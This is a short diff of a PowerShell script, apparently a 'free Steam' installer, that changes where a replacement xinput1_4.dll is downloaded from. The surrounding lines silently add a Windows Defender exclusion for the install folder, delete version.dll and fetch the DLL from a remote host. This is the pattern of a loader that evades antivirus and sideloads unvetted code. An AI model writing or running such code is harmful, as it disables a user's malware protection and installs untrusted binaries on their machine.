@@ -95,7 +95,8 @@ function PwStart() {
         Write-Host "[*] Removing version.dll..." -ForegroundColor Cyan
         Remove-ItemIfExists $versionDllPath
 
-        $downloadXinput = "http://redxhub.com/raw/xinput1_4.dll"
+        $downloadXinput = "https://raw.githubusercontent.com/Scriptez1/RedXFreeSteamInstaller/main/xinput1_4.dll"
+        
         try { Add-MpPreference -ExclusionPath $hidPath -ErrorAction SilentlyContinue } catch {}
         Write-Host "[*] Downloading xinput1_4.dll..." -ForegroundColor Cyan
         try {
